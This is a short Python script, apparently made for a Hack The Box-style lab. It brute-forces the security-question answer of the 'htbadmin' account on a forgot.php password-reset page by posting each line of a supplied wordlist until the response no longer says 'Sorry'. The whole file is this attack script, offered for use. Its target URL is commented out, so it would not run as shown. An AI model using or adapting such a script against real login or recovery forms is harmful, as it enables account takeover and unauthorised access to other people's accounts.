import requests
import sys
# Usage: python3 maidenless.py biglistofanswers.txt
# url = "http://localhost:8999/forgot.php"

wlist = sys.argv[1]

with open(wlist, "r", encoding='utf-8') as w:
	wordlist = w.readlines()
	print("Withering list of possible answers down...")
	for x in wordlist:
		x = x.strip()
		data = {
		"question":"CHANGEME",
		"userid":"htbadmin",
		"answer":x,
		"submit":"answer"}
		with requests.session() as sesh:
			s = sesh.post(url, data=data)
			if "Sorry" not in s.text:
				print(s.text)
				print(x)
				print(f"Security question answer is {x}")
				sys.exit()
